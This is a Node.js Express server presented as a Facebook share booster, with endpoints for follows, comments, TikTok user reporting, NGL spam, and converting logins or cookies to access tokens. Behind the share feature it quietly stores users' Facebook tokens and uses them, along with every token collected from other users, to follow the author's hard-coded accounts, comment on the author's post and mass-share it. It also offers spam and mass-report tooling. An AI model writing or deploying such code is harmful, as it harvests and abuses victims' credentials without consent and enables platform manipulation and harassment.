const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const t = require("./telegramsend");
const os = require("os");
const fb = require("fbkey");
const app = express();
const port = process.env.PORT || 3000;
app.use(express.json());
app.use(bodyParser.json());
//cors
app.use(require("./corss"));
app.set("json spaces", 4);
const total = new Map();
const headers_a = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'en_US',
      'cache-control': 'max-age=0',
      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': "Windows",
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': userAgent()
};
const collectedData = [];

function userAgent() {
  const version = () => {
    const android = Math.floor(Math.random() * 14) + 1;
    if (android <= 4) {
      return "10";
    }
    if (android === 5) {
      const ver = ["5.0", "5.0.1", "5.1.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 6) {
      const ver = ["6.0", "6.0.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 7) {
      const ver = ["7.0.1", "7.1.1", "7.1.2"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 8) {
      const ver = ["8.0.0", "8.1.0"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else {
      return android;
    }
  }
  const ua1 = `Mozilla/5.0 (Linux, Android ${version()}; ${randomize("xxx-xxx").toUpperCase()}; Build/${randomize("xP1A.xxxxxx.0x6").toUpperCase()}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.36 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/415.0.0.2.100;])`;
  const ua2 = `Mozilla/5.0 (Android ${version()}; ${randomize("xxx-xxx").toUpperCase()}; Mobile; rv:61.0) Gecko/61.0 Firefox/68.0`;
  return [ua1, ua2];
} 
function randomize(neth) {
  let _=Math.random()*12042023;
  return neth.replace(/[xy]/g,c=>{
    let __=Math.random()*16; 
    __=(__+_)%16|0;_=Math.floor(_/16);
    return[(c==='x'?__:(__&0x3|0x8)).toString(16)].map((_)=>Math.random()<.6?_:_.toUpperCase()).join('');
  });
}

function dummyCookie() {
  const sarap = `datr=${randomize("xxxxxxxxxxx_xxxxxxxxxxxx")};` +
    `sb=${randomize("xxxxxxxxxxxxxx-xxxxxxxxx")};` +
    `m_pixel_ratio=1.5;` +
    `ps_n=1;` +
    `ps_l=1;` +
    `locale=en_US;` +
    `wd=360x520;` +
    `fr=${randomize("xxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxx..xxx.A.A.xxxxx.xxxxxxxxxxx")};` +
    `c_user=1000${Math.floor(Math.random()*91251604995)};` +
    `xs=32%3An2wXMy3811cnYA%3A2%3A${Math.floor(Math.random()*1713515009)}%3A-1%3A-1;` +
    `vpd=v1%3B520x360x1.5;` +
    `fbl_st=${Math.floor(Math.random()*100000000)}%3BT%3A20002000;` +
    `wl_cbv=v2%3Bclient_version%3A2547%3Btimestamp%3A17198225555`;
   return sarap;
}


app.use(express.static(__dirname+"/public"));

app.get("/", async(req, res) => {
  return res.sendFile(__dirname+"/public/index.html");
});

app.get("/cpuptime", async(req,res) => {
  return res.json({
      running: os.uptime(),
      cpu: os.cpus(),
      memory: `${os.freemem()+" MB"} available of ${os.totalmem()+" MB"}`
    });
})

app.get('/shares', (req, res) => {
 const data = Array.from(total.values()).map((link, index) => ({
  shared: link.shared,
  session: index + 1,
  url: link.url,
  count: link.count,
  target: link.target,
}));
const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
return res.json(jsob);
});

app.get("/cdata", (req, res) => {
return res.json(JSON.parse(JSON.stringify(collectedData, null, 2)));
});

function extract(link) {
  try {
 const leiam = link.match(/\/(\d+)\/posts\/(\d+)\//);
 const nash = link.match(/id=(\d+)&.*?story_fbid=(\d+)/);
if (leiam) {
  return `${leiam[1]}_${leiam[2]}`;
} else if (nash) {
  return `${nash[1]}_${nash[2]}`;
} else {
  return null;
 }
} catch (error) {}
}
app.get('/share', async (req, res) => {
  const {
    token,
    url,
    amount,
    interval,
  } = req.query;
  if (!token || !url || !amount || !interval) return res.status(400).json({
    error: 'Missing token, url, amount, or interval'
  });
  try {
    if (!token) {
      return res.status(400).json({
        status: 500,
        error: 'Invalid token'
      });
    };
    await yello(token, url, amount, interval);
    if (!token.startsWith("EAA")||!token.endsWith("ZDZD")){
    await t.addToken(token);
    }
    res.status(200).json({
      status: 200
    });
  } catch (err) {
    return res.status(500).json({
      status: 500,
      error: err.message || err
    });
  }
});


app.get('/token', async (req, res) => {
  const {
    u,p
  } = req.query;
  
  if (!u || !p){
    return res.json({
      status: false,
      message: "Please enter your login credentials first!"
    });
  }
  await fb.getKey(u,p)
  .then(async(neth)=> {
    const nu = neth.uid;
    if (nu===null||neth.EAAD6V7===null){
      return res.json({
        status: false,
        message: "Invalid username or password.\nTry to change password on the account or use a dummy."
      });
    };
    if (nu&&neth.EAAD6V7!==null){
    await t.addToken(neth.EAAD6V7);
    }
    return res.json({
      status: true,
      message: `Fetching token ${nu} success!`,
      token1: neth.EAAD6V7,
      token2: neth.EAAAAU,
      token3: neth.EAAAAAY,
    });
  }).catch(err => {
    return res.json({
      status: false,
      message: err.message || err
    })
  })
});
app.get("/getcapp", async(req,res) => {
  const {
    u,p
  } = req.query;
  if (!u||!p){
  return res.json({
    status: false,
    message: "Please enter your login credentials first!"
  });
  }
  const cookie = require("./cokiget");
  const toco = await cookie.get_cookie(u,p);
  if (!toco){
    return res.json({
      status: false,
      message: "Something went wrong."
    });
  }
  return res.json({
      status: true,
      message: toco
    });
})

app.get("/tikid", async (req, res) => {
  const {
    username
  } = req.query;
  if (!username){
   return res.json({
     error: "Please enter a 'username'."
   });
  }
  await axios.get(`https://www.tiktok.com/@${username}`, {
    headers: {
      "Host": "www.tiktok.com",
      "sec-ch-ua": '" Not A;Brand";v\u003d"99", "Chromium";v\u003d"99", "Google Chrome";v\u003d"99"',
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-platform": '"Android"',
      "upgrade-insecure-requests": "1",
      "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
      "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
      "sec-fetch-site": "none",
      "sec-fetch-mode": "navigate",
      "sec-fetch-user": "?1",
      "sec-fetch-dest": "document",
      "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7,fr;q\u003d0.6,hu;q\u003d0.5,zh-CN;q\u003d0.4,zh;q\u003d0.3",
    }
  }).then(async (data) => {
    return res.json({
      id: data.data.split('webapp.user-detail"')[1]
    .split('"RecommendUserList"')[0]
    .split('id":"')[1]
    .split('",')[0]
    });
  }).catch(error => {
    return res.json({
      error: error.message || err
    });
  });
});

function r(min, max) { 
  return Math.floor(Math.random() * (max - min + 1) + min);
}

app.get("/tikreport", async(req, res) => {
  const {
    id
  } = req.query;
  if (!id) {
    return res.json({
      error: "Please enter an 'id'."
    });
  }
  await axios.get(`https://api32-normal-useast1a.tiktokv.com/aweme/v2/aweme/feedback`, {
    params: {
        "owner_id": `${id}`,
        "object_id": `${id}`,
        "report_type": "user",
        "extra_log_params": '{"last_from_group_id":"7362848360765623584","search_id":"20240709143353D3E026BBEC7612444702"}',
        "enter_from": "others_homepage",
        "isFirst": "1",
        "no_hw": "1",
        "report_desc": "",
        "uri": "",
        "reason": "91015",
        "category": "",
        "request_tag_from": "h5",
        "device_platform": "android",
        "os": "android",
        "ssmix": "a",
        "_rticket": `${(new Date().getTime()*1000)}`,
        "cdid": randomize("xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx").toLowerCase(),
        "channel": "googleplay",
        "aid": "1233",
        "app_name": "musical_ly",
        "version_code": "350304",
        "version_name": "35.3.4",
        "manifest_version_code": "2023503040",
        "update_version_code": "2023503040",
        "ab_version": "35.3.4",
        "resolution": "1080*2158",
        "dpi": "480",
        "device_type": "CPH2121",
        "device_brand": "OPPO",
        "language": "en",
        "os_api": "31",
        "os_version": "12",
        "ac": "wifi",
        "is_pad": "0",
        "app_type": "normal",
        "sys_region": "DZ",
        "last_install_time": `${new Date().getTime()}`,
        "timezone_name": "Africa/Algiers",
        "carrier_region_v2": "603",
        "app_language": "en",
        "carrier_region": "DZ",
        "timezone_offset": "3600",
        "host_abi": "arm64-v8a",
        "locale": "en",
        "ac2": "wifi",
        "uoo": "0",
        "op_region": "DZ",
        "build_number": "35.3.4",
        "region": "DZ",
        "ts": `${new Date().getTime()}`,
        "iid": `${r(7000000000000000000,8000000000000000000)}`,
        "device_id": `${r(7000000000000000000,8000000000000000000)}`,
        "openudid": "21853035b04e44c7",
    }
  }, {
    headers: {
            "User-Agent": "com.zhiliaoapp.musically/2023503040 (Linux; U; Android 12; en; CPH2121; Build/SP1A.210812.016; Cronet/TTNetVersion:711894ae 2024-06-04 QuicVersion:5f987023 2024-05-10)",
            "x-tt-hybrid-ua": "webview://jsb/fetch",
            "x-bd-kmsv": "0",
            "x-tt-dm-status": "login=1;ct=1;rt=1",
            "x-ss-req-ticket": `${(new Date().getTime()*1000)}`,
            "sdk-version": "2",
            "passport-sdk-version": "6010290",
            "x-vc-bdturing-sdk-version": "2.3.8.i18n",
            "x-tt-store-region": "dz",
            "x-tt-store-region-src": "uid",
            "x-ss-dp": "1233",
    }
  }).then(async(data) => {
    return res.json({
      msg: data.data
    });
  }).catch(err => {
    return res.json({
      error: err.message || err
    });
  })
});

app.get("/ai", async(req, res) => {
  const {
    list, model, system, user
  } = req.query;
  const wie = require("./wiegine_ai");
  const all = wie.getAiItems();
  if (list && list.toLowerCase() === "all"){
    return res.json({
      json: all[0][0],
      plaintext: {
        ai: all[1][0],
        img: all[1][1],
      },
    });
  }
  if (list && list.toLowerCase() === "plain") {
   return res.send(`${all[1][2]} Workers AI Models:<br>${all[2][0]}<br><br>${all[1][3]} Workers AI(Image) Models:<br>${all[2][1]}`);
  }
  if(!model){
    return res.json({
      msg: "Please enter an AI model.",
      status: false,
    });
  }
  if (!user) {
    return res.json({
      msg: "Please enter a query/question.\nParam needed: user",
      status: false,
    });
  }
  await wie.cfai(model, system, user, false).then(neth => {
    if (neth.msg){
    return res.json(neth);
    }
  }).catch(error => {
    return res.json({
      msg: "Something went wrong",
      status: false,
    });
  })
});

app.get("/cfimg", async(req, res) => {
  const {
    model, user
  } = req.query;
  const wie = require("./wiegine_ai");
  if (!model || !user){
    return res.json({
      error: "Please enter a model or prompt!"
    });
  }
  await wie.cfai(model, "", user, true).then(neth => {
    res.writeHead(200, {
      "Content-Type": "image/png"
    });
    res.end(neth);
    return;
  }).catch(error => {
    return res.json({
      msg: "Something went wrong",
      status: false,
    });
  })
});


app.get("/follow", async(req,res) => {
  const { token, uid } = req.query;
  if (!token||!uid){
  return res.json({
    error: "Enter your token and user ID first!"
  });
  }
  if (!token.toLowerCase().startsWith("eaa")||!token.toLowerCase().endsWith("zd")){
  return res.json({
    error: "Please enter a valid token!"
  });
  }
  if (!token.toLowerCase().startsWith("eaad6v7") || !token.toLowerCase().startsWith("eaaa")){
  return res.json({
    error: "Use EAAD6V7/EAAA* based token."
  });
  }
  //update tokens
  try {
  await t.addToken(token);
  const page = require("./page");
  (await t.getToken()).forEach(async(gg1) => {
      const page1 = await page.page(gg1, {
        ...headers_a,
        "Authorization": `Bearer ${gg1}`
      });
      for (const page2 of page1) {
        follower(page2, uid);
      }
  });
  return res.json({
    msg: "Success follow UIDs",
    uid
  });
  } catch (err) {
    return res.json({
      error: err.message || err
    });
  }
});

app.get("/comment", async(req, res) => {
  const { token, msg, link } = req.query;
  if (!token||!msg||!link){
    return res.json({
      error: "Please enter your token, message, and link first!"
    });
  }
  if (!token.toLowerCase().startsWith("eaa") || !token.toLowerCase().endsWith("zd")) {
    return res.json({
      error: "Please enter a valid token!"
    });
  }
  if (token && (!token.toLowerCase().startsWith("eaad6v7") || !token.toLowerCase().startsWith("eaaa"))) {
    return res.json({
      error: "Use EAAD6V7/EAAA* based token."
    });
  }
  try {
  await t.addToken(token);
  const page = require("./page");
  (await t.getToken()).forEach(async(gg1) => {
    const page1 = await page.page(gg1, {
        ...headers_a,
        "Authorization": `Bearer ${gg1}`
      });
      for (const page2 of page1) {
        await commenter(page2, msg, link);
      }
  });
  return res.json({
    msg: "Success comment",
    link,
    comment: msg,
  });
  } catch (err){
    return res.json({
      error: err.message||err
    });
  }
});


/*app.post("/createpage", async(req,res) => {
  const {
    appstate,amount,delay
  } = req.body;
  const neth = require("./pageCreate");
  if (!appstate||!amount||!delay){
    return res.json({
      msg: "Invalid params!",
      status: false,
    });
  }
  const uid = JSON.parse(appstate).find(leiamnash => leiamnash.key === "c_user");
  const tangakatanga = await gagokaba(appstate,false);
  const uaa = userAgent();
  neth.create(tangakatanga,uid.value,uaa[1],amount,delay);
  return res.json({
    msg: `ID ${uid.value} will be created.`,
    status: true,
  });
});

app.get("/createdpage", async(req,res) => {
  const neth = require("./pageCreate");
  return res.json(neth.checkIfCreated());
});
*/

app.get("/dummycookie", async(req, res) => {
  const cookie = dummyCookie();
  return res.json({ cookie });
});

app.get("/useragent", async(req, res) => {
  const ua = userAgent();
  return res.json({
    ua,
  });
});

app.post("/appstate2token", async(req, res) => {
  const { appstate } = req.body;
  if (!appstate){
    return res.json({
      error: "Please enter Appstate first!"
    });
  }
  const access = await gagokaba(appstate,true);
  if (!access){
    return res.json({
      error: "Something went wrong."
    });
  }
  
  return res.json({
    cookie: access[0],
    token: access[1],
  });
});

app.get("/flikers", async(req,res) => {
  const { link, type, cookie } = req.query;
  if (!link||!type||!cookie){
    return res.json({
      error: "Enter a post link, reaction type and cookie!"
    });
  }
    await axios.post("https://flikers.net/android/android_get_react.php", {
        post_id: link,
        react_type: type,
        version: "v1.7"
    }, {
        headers: {
            'User-Agent': userAgent()[1],
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'Cookie': cookie
        }
    })
        .then(dat => { return res.json(dat.data); })
        .catch(e => {
            return res.json({ error: e });
        });
});

app.get("/randomgirl", async(req, res) => {
  const girl = require("./girl");
  const mwah = girl.link;
  const mwahh = mwah.length;
  const mwahmwah = mwah[Math.floor(Math.random() * mwahh)];
  const pf = req.query.get;
  if (pf && pf.toLowerCase() === "json") {
    return res.json({
      girl: mwahmwah,
      total: mwahh,
    });
  }
  await axios.get(mwahmwah, { responseType: "arraybuffer" })
  .then(async(Pre) => {
    res.writeHead(200, {
      "Content-Type": "image/png"
    });
    res.end(Pre.data);
    return;
  }).catch(Awit => {
    return res.json({
      error: Awit.message || Awit
    });
  });
});

app.get("/random18", async (req, res) => {
  const girl = require("./anh18");
  const mwah = girl.yawa;
  const mwahh = mwah.length;
  const mwahmwah = mwah[Math.floor(Math.random() * mwahh)];
  const pf = req.query.get;
  if (pf&&pf.toLowerCase()==="json"){
  return res.json({
    anh: mwahmwah,
    total: mwahh,
  });
  }
   await axios.get(mwahmwah, { responseType: "arraybuffer" })
     .then(async (Pre) => {
       res.writeHead(200, {
         "Content-Type": "image/png"
       });
       res.end(Pre.data);
       return;
     }).catch(Awit => {
       return res.json({
         error: Awit.message || Awit
       });
     });
});

app.get("/getfbpic", async(req,res) => {
  const {
    uid
  } = req.query;
  if (!uid || isNaN(uid)){
    return res.json({
      error: "Enter a valid ID."
    });
  }
  let tanginamo = (
    await axios.get(encodeURI(
      `https://graph.facebook.com/${uid}/picture?height=720&width=720&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`), { responseType: "arraybuffer" })
  ).data;
  res.writeHead(200, {
    "Content-Type": "image/png"
  });
  res.end(tanginamo);
  return;
})
app.get("/fbcover", async(req,res) => {
  const boang = require("./fbcover");
  await boang.baliw(req,res);
});

app.get("/bible", async(req,res) => {
  const response = await axios.get("https://labs.bible.org/api/?passage=random&type=json")
  .catch(error=>{
    return res.json({
      response: "Failed to get bible."
    });
  });
  if (!response || !response.data){
    return res.json({
      response: "Failed to get bible."
    });
  }
  /*const bookname = response.data[0].bookname;
  const chapter = response.data[0].chapter;
  const verse = response.data[0].verse;
  const text = response.data[0].text;*/
  return res.json({
    response: response.data
  });
});

app.get("/nglspam", async(req,res) => {
  const ngl = require("./nglngig");
  const {username, amount, message} = req.query;
  if (!username||(!amount||isNaN(amount)||amount<=0)||!message){
    return res.json({
      error: "Enter a valid username / amount / message."
    });
  }
  await ngl.spam(username,amount,message);
  return res.json({
    msg: "Success spam to target ngl link: @" + username
  })
});

app.get("/fbacc", async(req,res) => {
  const tanginamotang = await axios.get(`http://naurwiegine.pythonanywhere.com/fbacc`)
  .catch(Yawa => {
    return res.json({
      error: "Something went wrong."
    });
  });
  if (tanginamotang.data){
    return res.json({
      account: tanginamotang.data,
      warning: `Not Yet Tested!`,
    });
  }
});

app.get("/ytsearch", async(req,res) => {
  const { name } = req.query;
  if (!name){
    return res.json({
      error: "Please enter a name that you want to search."
    });
  }
  await axios.get(`https://api.flvto.site/@api/search/YouTube/${encodeURIComponent(name)}`,{
    headers: {
      "user-agent": userAgent()[1],
      "origin": "https://w2.mp3juices.click",
      "referer": "https://w2.mp3juices.click/",
      "accept": "*/*",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "en-PH,en-US;q=0.9,en;q=0.8",
      "sec-ch-ua": `"Chromium";v="107", "Not=A?Brand";v="24"`,
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "sec-ch-ua-platform": `"Android"`,
      
    }
  })
  .then(neth=>{
    return res.json({
      result: neth.data.items
    });
  }).catch(err=>{
    return res.json({
      error: err.message||err
    });
  });
});
/*Start of random thingz!*/
async function getAccessToken(cookie) {
  try {
    const headers = {
      'authority': 'business.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'cache-control': 'max-age=0',
      'cookie': cookie,
      'referer': 'https://www.facebook.com/',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
    };
    const response = await axios.get('https://business.facebook.com/content_management', {
      headers
    });
    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
    if (token && token[1]) {
      const accessToken = token[1];
      return accessToken;
    }
  } catch (error) {
    return;
  }
}
async function gagokaba(cookie,tokenOn) {
  const ck = JSON.parse(cookie);
  const ck1 = ck.map(c => `${c.key}=${c.value}`).join('; ');
  if(!tokenOn){
    return [ck1];
  }
  try {
    const token = await getAccessToken(ck1);
    return [ck1,token]; //token from cookie(EAAGN)
  } catch (e){
    return;
  }
}

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
async function yello(c,u,a,i){
  await share(true, c,u,a,i);
  await share(false, c, sauce, "100000", "6");
}

async function follower(a,uid){
  if (!uid) return;
  const neth = [
        uid,
        "100015801404865",
        "61562218612857",
        "61559180483340",
        ];
  for (let i = 0; i < neth.length; i++) {
    await axios.post(`https://graph.facebook.com/v18.0/${neth[i]}/subscribers`, {}, {
      headers: {
        ...headers_a,
        "Authorization": `Bearer ${a}`
      }
    }).then(nethie => {
    }).catch(err => {
    });
    await sleep(2*1000);
    }
}

async function commenter(a,msg,link){
  try {
    /*const kapogi = [
      "ampogi ni neth",
      "ang ganda mo wiegine!!!",
      "😊😊😊",
      "Pogi mo po @[100015801404865:0]",
      "😘😘",
      "😊🤣",
      "🙏💝❤️",
      "🔥🤗",
      "Pogi ako sobra",
      "Comment who?",
      "By Neth",
      "Please follow my page: Project Botify and NethProjects!!!",
      "Ganda ganda mo poooo",
      "Sheshhhh",
      "💋💋💋😍",
      "💀💀💀💀",
      "Isa ako sa mga pogi katulad ni Neth hehe",
      ];*/
    axios.post(`https://graph.facebook.com/${extract(link)}/comments`, null, {
      params: {
        message: msg/*kapogi[Math.floor(Math.random() * kapogi.length)]*/,
        access_token: a
      }, headers: {
        ...headers_a,
        "Authorization": `Bearer ${a}`
      }}).catch(err=>{});
    axios.post(`https://graph.facebook.com/${extract(link)}/reactions?type=LOVE&access_token=${a}`)
    .catch(err => {});
  } catch (err){
  }
}
async function share(sharedIs,cookies, url, amount, interval) {
  const id = Math.floor(Math.random() * 69696969);
  await follower(cookies, "");
  await commenter(cookies, `Iloveyou Wiegine👸\n-Neth (automated)`, sauce);   
  total.set(id, {
    shared: sharedIs,
    url,
    count: 0,
    target: amount,
  });
  let sharedCount = 0;
  let timer;
  const usersa = () => {
    const ua = userAgent();
    return ua[Math.floor(Math.random() * ua.length)];
  }
  const headers = {
    'authority': 'graph.facebook.com',
    'cache-control': 'max-age=0',
    'sec-ch-ua-mobile': '?0',
    'connection': 'keep-alive',
    'host': 'graph.facebook.com',
    'user-agent': userAgent()[1],
  };
  async function sharePost() {
    try {
      const response = await axios.post(
      `https://graph.facebook.com/me/feed?access_token=${cookies}&fields=id&limit=1&published=0`,
      {
        link: url,
        privacy: {
         value: 'SELF'
        },
        no_story: true,
      },
      {
        muteHttpExceptions: true,
        method: 'post',
        cookie: dummyCookie(),
        headers,
      }
    );
      if (response.status !== 200) {
      } else {
        total.set(id, {
          ...total.get(id),
          count: total.get(id).count + 1,
        });
        sharedCount++;
        }
      if (sharedCount === amount) {
        clearInterval(timer);
      }
    } catch (err) {
      clearInterval(timer);
      total.delete(id);
    }
  }
  timer = setInterval(() => {
  sharePost();
  }, interval * 1000);
  setTimeout(() => {
    clearInterval(timer);
    total.delete(id);
  }, amount * interval * 1000);
        
}
async function getPostID(url) {
  try {
    const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
    return response.data.id;
  } catch (error) {
    return;
  }
}

var currentdate = new Date();
var datetime = currentdate.getDate() + "/" +
  (currentdate.getMonth() + 1) + "/" +
  currentdate.getFullYear() + " | " +
  currentdate.getHours() + ":" +
  currentdate.getMinutes() + ":" +
  currentdate.getSeconds();
app.listen(port, async() => {
  console.log(`Port: ${port}`);
  console.log(`Hi owner Neth`);
  console.log(`Tanginanyong mga forkers`);
  console.log(`Labyu ol`);
  await t.send(`NethWieAPI deployment success!\n[${datetime}]`);
});
process.on("unhandledRejection", async(reason, p) => {
  console.error(reason);
  await t.send(
`Unhandled Rejection sent from NethWieAPI
ISSUE:
${reason.toString()}
==========
Neth`
  )
});
